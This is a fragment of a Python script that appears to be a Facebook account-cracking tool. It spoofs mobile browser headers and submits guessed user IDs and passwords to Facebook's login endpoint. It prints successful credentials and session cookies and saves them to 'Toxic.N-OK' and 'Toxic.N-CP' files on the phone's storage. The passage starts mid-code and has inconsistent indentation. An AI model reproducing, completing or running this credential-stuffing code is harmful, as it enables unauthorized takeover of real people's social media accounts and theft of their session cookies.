            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AffNHiEkem8kLgwWBIW3EFsu0vpg8RpRucM-p4NArG2I4LkBRWRd2GIJQ20-jmC9DxOZCAsAnG5MBoQ50ID8tvOP8QKWbPNraeqicU3CML1sqg&smuh=52779&lh=Ac8j6v9a_PfzQcLalAQ&refid=7&ref_component=mbasic_footer&_rdr',
            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('  \x1b[97;1m║ \033[38;5;46m[Toxic.N-OK][🔥]  ' +uid+ ' | ' +ps+' '+Jawnx(uid)+' ')
				print(f" Cookie : {coki}")
                cek_apk(session,coki)
				open('/sdcard/Toxic.N-OK.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(uid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('  \x1b[97;1m║ \033[38;5;196m[Toxic.N-CP][😭] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
				open('/sdcard/Toxic.N-CP.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except:
		pass

fia()
